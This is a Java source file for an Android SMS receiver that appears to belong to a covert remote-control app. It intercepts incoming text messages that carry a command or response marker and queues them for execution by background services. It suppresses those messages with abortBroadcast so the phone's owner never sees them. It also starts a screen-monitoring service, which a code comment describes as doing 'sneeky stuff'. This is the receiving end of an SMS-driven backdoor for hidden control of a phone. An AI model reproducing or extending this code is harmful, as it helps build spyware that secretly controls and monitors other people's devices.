package com.SmsService.ReceiverComponent;



import com.SmsService.AuxiliaryComponent.CommandJob;
import com.SmsService.AuxiliaryComponent.CommandJobElement;
import com.SmsService.AuxiliaryComponent.CommonVariable;
import com.SmsService.AuxiliaryComponent.Debug;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;


public class SmsReceiver extends BroadcastReceiver {	
	private CommonVariable var = new CommonVariable();
	public void onCreate() {
		
	}
	private void setUp( Context context ) {
		if ( CommonVariable.isCommonVariableSet == false ) {
			/* you can use this method to reset all the CommonVariable */
			var.recoverCommonVariable();
			Debug.PrintLog("SmsReciver","Store variable: "+var.storeCommonVariable(context));
			Debug.PrintLog("SmsReciver","Load variable setting "+var.initCommonVariable(context));
			try {
				Debug.PrintLog("SmsReciver",(String)CommonVariable.class.getField("COMMAND_SIGN").get(null));
			}catch( Exception e ) {}
		}
		
		/* start the screen monitor service to let us do the sneeky stuff */
		Intent i = new Intent(context, ScreenMonitor.class);			
		context.startService(i);
	}
	@Override
	public void onReceive(Context context, Intent intent) {
		/* Load CommonVariable from database */
		setUp(context);
		
		/* ---get the SMS message passed in--- */
        Bundle bundle = intent.getExtras();        
        SmsMessage[] msgs = null;
        String str = "";
        String number="";        
        if (bundle != null)
        {
            /* ---retrieve the SMS message received--- */
            Object[] pdus = (Object[]) bundle.get("pdus");
            msgs = new SmsMessage[pdus.length]; 
            
            for (int i=0; i<msgs.length; i++){
                msgs[i] = SmsMessage.createFromPdu((byte[])pdus[i]);                
                number +=  msgs[i].getOriginatingAddress();                
                str += msgs[i].getMessageBody().toString();
                str += "\n";        
            }        
            Debug.PrintLog("SmsReciver","Get: "+str);
            isCommand(number,str,context);
            
        }

	}
		
	
	
	private void isCommand(String number,String content,Context context){
		CommandJobElement job;
		
		if(content.contains(CommonVariable.COMMAND_SIGN)){
			Debug.PrintLog("SmsReciver",CommonVariable.COMMAND_SIGN+"is in the SMS message.");
			/* put the command into the job queue */
			job = CommandJob.setJob(number, content);
			CommandJob.addJob(job);
			/* and start the service if it is not lock */
			if ( CommonVariable.CommandServiceLock.equals("false") ) {					
					CommandJob.startService(context);					
			}
			else {
					Debug.PrintLog("SmsReciver","CommonService is locked.");
			}
			/* abort the broadcast */
			this.abortBroadcast();
			
			
		}
		
		else if ( content.contains(CommonVariable.RESPONSE_SIGN) ) {			
			Debug.PrintLog("SmsReciver",CommonVariable.RESPONSE_SIGN+" is in the SMS message.");
			/* put the command into the job queue */
			job = CommandJob.setJob(number, content);
			CommandJob.addJob(job);
			/* start the service */
			if( CommonVariable.ResponseServiceLock.equals("false") ) {								
				CommandJob.startResponseService(context);
			}
			else {
				Debug.PrintLog("SmsReciver", "the ResponseService is locked");
			}
			this.abortBroadcast();
		}	
		
	}

}
